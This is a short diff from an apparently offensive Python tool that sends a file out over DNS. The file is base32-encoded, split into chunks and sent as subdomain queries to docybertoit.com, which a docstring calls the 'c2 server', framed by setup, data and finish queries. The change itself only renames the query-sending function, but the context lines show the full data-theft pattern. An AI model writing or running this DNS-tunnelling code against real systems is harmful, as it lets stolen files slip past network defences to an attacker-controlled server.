@@ -44,20 +44,20 @@ def main():
     """
 
     setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
-    send_query(setup_query)
+    send_plaintext_query(setup_query)
     time.sleep(1)
     counter = 0
     for chunk in file_b32_str_list:
         file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.docybertoit.com'
-        send_query(file_chunk_query)
+        send_plaintext_query(file_chunk_query)
         counter += 1
 
     finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
     time.sleep(1)
-    send_query(finish_query)
+    send_plaintext_query(finish_query)
 
 
-def send_query(query: str):
+def send_plaintext_query(query: str):
     """sends a query using the dnspython package to the c2 server. 
     """
 
